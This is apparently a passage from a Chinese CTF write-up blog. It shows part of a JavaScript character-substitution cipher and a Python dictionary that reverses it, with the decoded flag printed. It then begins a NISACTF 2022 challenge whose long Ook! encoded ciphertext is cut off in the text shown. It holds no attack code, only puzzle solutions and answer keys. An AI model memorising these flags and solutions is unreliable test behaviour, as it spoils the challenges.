   encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;`&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;^&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;l&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&amp;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;t&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;(&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;6&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;)&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;n&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;=&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;`&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;k&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;p&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#123;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\&quot;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&amp;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;[&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;]&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;|&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;:&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;%&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&quot;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;|&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;,&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&lt;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;@&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;&gt;&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;&#123;&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;,&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;u&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;.&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;7&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;?&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;y&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            encryptedString = encryptedString.<span class="title function_">concat</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attr">default</span>:</span><br><span class="line">            hasInvalidCharacter = <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hasInvalidCharacter) &#123;</span><br><span class="line">    encryptedString = <span class="string">&quot;Invalid String!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Your encoded string is <span class="subst">$&#123;encryptedString&#125;</span>`</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据js脚本 是一个字母符号置换表  py转成字典</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="built_in">list</span> = &#123;<span class="string">&#x27;!&#x27;</span>: <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;b&#x27;</span>, <span class="string">&#x27;)&#x27;</span>: <span class="string">&#x27;c&#x27;</span>, <span class="string">&#x27;v&#x27;</span>: <span class="string">&#x27;d&#x27;</span>, <span class="string">&#x27;m&#x27;</span>: <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27; &#x27;</span>: <span class="string">&#x27;f&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;q&#x27;</span>: <span class="string">&#x27;g&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;h&#x27;</span>, <span class="string">&#x27;c&#x27;</span>: <span class="string">&#x27;i&#x27;</span>, <span class="string">&#x27;]&#x27;</span>: <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;(&#x27;</span>: <span class="string">&#x27;k&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;m&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;n&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;o&#x27;</span>, <span class="string">&#x27;$&#x27;</span>: <span class="string">&#x27;p&#x27;</span>, <span class="string">&#x27;*&#x27;</span>: <span class="string">&#x27;q&#x27;</span>, <span class="string">&#x27;i&#x27;</span>: <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>: <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;#&#x27;</span>: <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;&lt;&#x27;</span>: <span class="string">&#x27;u&#x27;</span>, <span class="string">&#x27;?&#x27;</span>: <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;o&#x27;</span>: <span class="string">&#x27;w&#x27;</span>, <span class="string">&#x27;^&#x27;</span>: <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;y&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;_&#x27;</span>: <span class="string">&#x27;z&#x27;</span>, <span class="string">&#x27;h&#x27;</span>: <span class="string">&#x27;0&#x27;</span>, <span class="string">&#x27;w&#x27;</span>: <span class="string">&#x27;1&#x27;</span>, <span class="string">&#x27;e&#x27;</span>: <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;3&#x27;</span>, <span class="string">&#x27;g&#x27;</span>: <span class="string">&#x27;4&#x27;</span>, <span class="string">&#x27;z&#x27;</span>: <span class="string">&#x27;5&#x27;</span>, <span class="string">&#x27;d&#x27;</span>: <span class="string">&#x27;6&#x27;</span>, <span class="string">&#x27;~&#x27;</span>: <span class="string">&#x27;7&#x27;</span>, <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;8&#x27;</span>, <span class="string">&#x27;x&#x27;</span>: <span class="string">&#x27;9&#x27;</span>, <span class="string">&#x27;j&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;:&#x27;</span>: <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;b&#x27;</span>: <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;`&#x27;</span>: <span class="string">&#x27;%&#x27;</span>, <span class="string">&#x27;l&#x27;</span>: <span class="string">&#x27;^&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;t&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;s&#x27;</span>: <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;n&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;;&#x27;</span>: <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\\&#x27;</span>: <span class="string">&#x27;-&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;[&#x27;</span>, <span class="string">&#x27;\\\\&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;l&#x27;</span>, <span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&#x27;%&#x27;</span>: <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;|&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;,&#x27;</span>: <span class="string">&#x27;\\&#x27;</span>, <span class="string">&#x27;@&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;u&#x27;</span>: <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;y&#x27;</span>: <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;a&#x27;</span>: <span class="string">&#x27;//&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>&#125;</span><br><span class="line"></span><br><span class="line">cipher =<span class="string">&#x27; &#125;!q&quot;)hiim)#&#125;-nvm)i-$#mvn#0mnbm)im#n &#125;!qnm8)i-$#mvnoc#0nz&lt;$9inm!&gt;-n1:1-nm8)i-$~c58n!&#125;qhij#0[noic##m8nc8n?!8c&#125;w!n]&gt;&amp;&#x27;</span></span><br><span class="line"></span><br><span class="line">m = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> cipher:</span><br><span class="line">    m  += <span class="built_in">list</span>[i]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(m)</span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;c0rrectly_decrypted_the_$ecret_flag_encrypted_with_5up3r_easy_b@by_encryp7ion_alg0r!thm_written_in_vanil1a_js&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="NISACTF-2022-normal-【套娃提-Ook-】"><a href="#NISACTF-2022-normal-【套娃提-Ook-】" class="headerlink" title="[NISACTF 2022]normal 【套娃提 Ook!】"></a>[NISACTF 2022]normal 【套娃提 Ook!】</h3><p>题目</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">..... ..... ..... ...!? !!.?. ..... ..... ..... ..?.? !.?.. ..... .....</span><br><span class="line">..... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .....</span><br><span class="line">!.!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... .!... ....! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?....</span><br><span class="line">..... ..... ....! .!!!! !!!!! !!!!! !.?.. ..... ....! ?!!.? ..... .....</span><br><span class="line">?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!!</span><br><span class="line">!!!!! .!... ..... ..... !.... ...!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?. ..... ..... ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.?</span><br><span class="line">!.?.. ..... ..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!.</span><br><span class="line">!.... ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?... .....</span><br><span class="line">..... ...!. !!!!! !!!!! !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ...!. ....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... .!... !.?.. .....</span><br><span class="line">..... .!?!! .?... ..... ....? .?!.? ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ....! .!!!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ..... !.!!! !!!!! !!!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? .....</span><br><span class="line">..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. .....</span><br><span class="line">!.!!! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .!.?.</span><br><span class="line">..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!!</span><br><span class="line">!!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! ...!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... .!.!! !!!!! !!!!. ?.... ..... ..!?! !.?.. ..... ...?.</span><br><span class="line">?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!!</span><br><span class="line">!!!.! ..... ..... ...!. !!!!! !!!!. ?.... ..... ....! ?!!.? ..... .....</span><br><span class="line">..?.? !.?.. ..... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">....! .!!!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .....</span><br><span class="line">!.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!!</span><br><span class="line">.?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... !.!!! !!!!.</span><br><span class="line">?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... ...!. ?.... .....</span><br><span class="line">..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!!</span><br><span class="line">!!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.?</span><br><span class="line">!!!!! !!!!! !.!.. ..... ..... .!.!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ..... !.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... .....</span><br><span class="line">..... ..... ..!.! !!!!! !!!!! !!!!! !!!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?!</span><br><span class="line">.?... ..... ..... ..... !.!!! !!!!! !!!!! !!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.?</span><br><span class="line">!!!!! !!!!! !.!.. ..... !.!!! .?... ..... ..... !?!!. ?.... ..... ...?.</span><br><span class="line">?!.?. ..... ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? .....</span><br><span class="line">..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. .....</span><br><span class="line">....! ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.? ..... .....</span><br><span class="line">..... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?. ..... .....</span><br><span class="line">..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ...!.</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... ...!. !!!!! !!!!. ?.... .....</span><br><span class="line">....! ?!!.? ..... ..... ..?.? !.?.. ..... ...!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!. ?.... ..... ....! ?!!.?</span><br><span class="line">..... ..... ..?.? !.?.. ..... .!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ..... .!.!! !!!!! !!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?.... ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">..... .!... ..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?...</span><br><span class="line">..... ...!? !!.?. ..... ....? .?!.? !.?.. ..... ..... ..... !?!!. ?!!!!</span><br><span class="line">!!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... ..... ....! .?... ..... .....</span><br><span class="line">!?!!. ?.... ..... ...?. ?!.?. ..... ..... ..... ..!.! !!!!! !!!!! !!!!.</span><br><span class="line">?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.?</span><br><span class="line">!!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!!</span><br><span class="line">!.?.. ..... ..... .!?!! .?... ..... ....? .?!.? ..... ..... !.?.. .....</span><br><span class="line">....! ?!!.? ..... ..... ?.?!. ?!.?. ..... ..... ..... .!?!! .?!!! !!!!!</span><br><span class="line">!!!!! !!!?. ?!.?! !!!!! !!!!! .!... ..... ..... !.!!! !!!!! !!!.? .....</span><br><span class="line">..... ...!? !!.?. ..... ..... .?.?! .?... ..... ..... .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! ..... !.?.. ..... ..... .!?!!</span><br><span class="line">.?... ..... ....? .?!.? ..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!.</span><br><span class="line">?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!.</span><br><span class="line">..... ..... ....! .!.?. ..... ..... ..!?! !.?.. ..... ..... ?.?!. ?..!.</span><br><span class="line">?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... ..... ....! ?!!.?</span><br><span class="line">!!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ..... !.!!! !!!!.</span><br><span class="line">?.... ..... ....! ?!!.? ..... ..... ..?.? !.?.. ..... .!.?. ..... .....</span><br><span class="line">!?!!. ?.... ..... .?.?! .?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!!</span><br><span class="line">!!!!? .?!.? !!!!! !!!!! !.!.. ..... ..... .!.!! !!!!! !!.?. ..... .....</span><br><span class="line">..!?! !.?.. ..... ..... ?.?!. ?.... ..... ...!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... .!... ....! .?... ..... ..... !?!!. ?....</span><br><span class="line">..... ...?. ?!.?! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. .....</span><br><span class="line">..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... .....</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .....</span><br><span class="line">..!.! !!!!! !!!!! !!!!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?...</span><br><span class="line">..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! .....</span><br><span class="line">..... ..... !.!!! !!!!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">..... .!.?. ..... ..... !?!!. ?.... ..... .?.?! .?!.? ..... ..... .....</span><br><span class="line">..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!! !.!.. ..... ....! .?...</span><br><span class="line">..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... ..... !.!!! !!!!!</span><br><span class="line">!!!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... !.... .!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?..!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... .!... ..... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?... ..... ..... ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... ....! .!!!! !!!.? ..... ..... ...!? !!.?. .....</span><br><span class="line">..... .?.?! .?... ..... !.?.. ..... ....! ?!!.? ..... ..... ?.?!. ?!.?.</span><br><span class="line">..... ..... ..... .!?!! .?!!! !!!!! !!!!! !!!?. ?!.?! !!!!! !!!!! .!...</span><br><span class="line">..... ...!. ..... ...!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?. .....</span><br><span class="line">..... ..... ....! .?... ..... ...!? !!.?. ..... ....? .?!.? !.?.. .....</span><br><span class="line">..... ..... !?!!. ?!!!! !!!!! !!!!! !!?.? !.?!! !!!!! !!!!. !.... .....</span><br><span class="line">....! .?... ..... ..... !?!!. ?.... ..... ...?. ?!.?. ..... ..... .....</span><br><span class="line">..... .!.!! !!!!! !!!!! !!!!! !!.?. ..... ..... !?!!. ?.... ..... .?.?!</span><br><span class="line">.?!.? ..... ..... ..... ..!?! !.?!! !!!!! !!!!! !!!!? .?!.? !!!!! !!!!!</span><br><span class="line">!.!.. ..... ....! ...!. ?.... ..... ....! ?!!.? ..... ..... ..?.? !.?..</span><br><span class="line">..!.? ..... ..... .!?!! .?... ..... ..?.? !.?!. ?.... ..... ..... ...!?</span><br><span class="line">!!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!! !!!!! !!.!. ..... ..... ....! .!.?.</span><br><span class="line">..... ..... ..!?! !.?.. ..... ..... ?.?!. ?..!. ?.... ..... ..!?! !.?..</span><br><span class="line">..... ...?. ?!.?! .?... ..... ..... ....! ?!!.? !!!!! !!!!! !!!!! !?.?!</span><br><span class="line">.?!!! !!!!! !!!.! ..... ..... .!... ..... .!.?. ..... ..... !?!!. ?....</span><br><span class="line">..... .?.?! .?... ..... ..... ..... ..!.? ..... ..... .!?!! .?... .....</span><br><span class="line">..?.? !.?!. ?.... ..... ..... ...!? !!.?! !!!!! !!!!! !!!!! ?.?!. ?!!!!</span><br><span class="line">!!!!! !!.!. ..... ..... !.... .!.?. ..... ..... ..!?! !.?.. ..... .....</span><br><span class="line">?.?!. ?..!. ?.... ..... ..!?! !.?.. ..... ...?. ?!.?! .?... ..... .....</span><br><span class="line">....! ?!!.? !!!!! !!!!! !!!!! !?.?! .?!!! !!!!! !!!.! ..... ..... ...!.</span><br><span class="line">..!.? ..... ..... ...!? !!.?. ..... ..... .?.?! .?..! .?... ..... ...!?</span><br><span class="line">!!.?. ..... ....? .?!.? !.?.. 